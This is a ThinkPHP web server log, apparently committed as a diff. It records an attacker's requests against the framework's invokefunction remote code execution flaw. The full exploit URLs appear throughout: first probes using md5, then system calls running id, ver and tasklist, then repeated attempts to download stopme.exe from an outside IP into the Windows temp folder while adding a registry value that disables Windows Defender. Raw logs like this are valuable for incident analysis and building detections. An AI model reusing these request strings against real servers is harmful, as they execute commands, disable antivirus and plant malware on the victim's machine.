+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/KI2PV72FYF.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T09:46:50+08:00 ] 102.165.48.141 GET /relaxed/public/index.php/admin/index/login
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,211.79kb] [文件加载：80]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'libwww-perl/6.35',
+  'host' => 'picc.18178.net',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
+[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
+[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
+[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
+  0 => 'breadcrumb',
+  1 => 'site',
+  2 => 'config',
+  3 => 'auth',
+  4 => 'admin',
+  5 => 'background',
+  6 => 'title',
+) ]
+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T10:14:14+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T10:14:16+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T10:14:18+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.202801s][吞吐率：4.93req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T10:14:19+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.218400s][吞吐率：4.58req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T10:14:21+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.452400s][吞吐率：2.21req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T10:17:26+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4WFZAX373E.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4WFZAX373E.exe [运行时间：0.093601s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/4WFZAX373E.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T10:17:28+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4WFZAX373E.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4WFZAX373E.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/4WFZAX373E.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T12:34:39+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T12:34:41+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T12:34:43+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T12:34:44+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.171601s][吞吐率：5.83req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T12:34:46+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.452401s][吞吐率：2.21req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T12:37:51+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FRJCKQNQYHV.exe
